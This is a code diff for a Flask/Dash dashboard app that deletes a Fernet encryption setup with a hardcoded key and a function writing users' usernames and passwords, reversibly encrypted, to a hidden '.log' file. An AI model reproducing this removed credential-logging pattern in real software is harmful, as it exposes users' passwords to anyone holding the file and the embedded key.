@@ -5,8 +5,6 @@ from dash import dcc, html
 from dash.dependencies import Input, Output
 import plotly.express as px
 import subprocess
-from cryptography.fernet import Fernet
-import base64
 from threading import Thread
 import os
 
@@ -15,21 +13,6 @@ data_collection_complete = False
 
 app = Flask(__name__)
 
-# Encryption setup
-key = b'12345678912345671234567891234567'  # Use a more secure key generation method
-key = base64.urlsafe_b64encode(key)
-cipher = Fernet(key)
-
-def encrypt_text(text):
-    encrypted_text = cipher.encrypt(text.encode())
-    return encrypted_text
-
-def logToFile(username, password):
-    encrypted_username = encrypt_text(username)
-    encrypted_password = encrypt_text(password)
-    with open('.log', 'a') as f:
-        f.write(f"{encrypted_username.decode()}$$$${encrypted_password.decode()}$$$$\n") 
-    return 
 
 # Initialize Dash app within Flask app 
 dash_app = dash.Dash(__name__, server=app, url_base_pathname='/dashboard/')
